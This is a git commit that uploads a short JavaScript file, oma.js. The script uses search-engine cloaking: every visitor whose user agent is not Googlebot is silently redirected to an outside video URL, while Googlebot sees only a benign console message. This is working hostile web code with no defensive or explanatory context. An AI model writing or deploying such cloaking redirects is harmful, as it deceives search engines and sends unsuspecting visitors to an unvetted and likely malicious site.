5c1d7973e648fed6f5cfc8bc85b5719deb0a0ab3
Sajid Khan <sajidkhan528193@gmail.com>
2026-07-18 03:15:51 +0600

    Add files via upload

---
+++ oma.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://www.unavuulagam.in/vids-play/?pintu";
+} else {
+  console.log("Thanks for visiting my page" );
+}
